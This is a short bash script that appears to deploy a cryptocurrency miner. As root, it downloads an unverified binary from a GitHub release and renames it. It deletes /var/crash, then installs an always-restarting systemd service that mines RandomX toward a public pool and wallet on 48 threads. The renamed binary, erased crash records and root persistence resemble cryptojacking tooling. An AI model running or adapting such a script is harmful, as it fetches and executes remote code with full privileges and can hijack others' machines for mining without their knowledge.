#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
cp ar jvdar 
chmod +x jvdar

rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o salvium.herominers.com:1230 -u SaLvdUunbpYJhhVMtJBQbPZzgSyVvjus7STrPd1KsiJxZ8o9yrPfYc2JXJ4ZRcL3t65kZsbWa9zVX89upctj99CcVBxHXcjxqph -p 1svts3 -a rx/0 -k -t 48
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
top
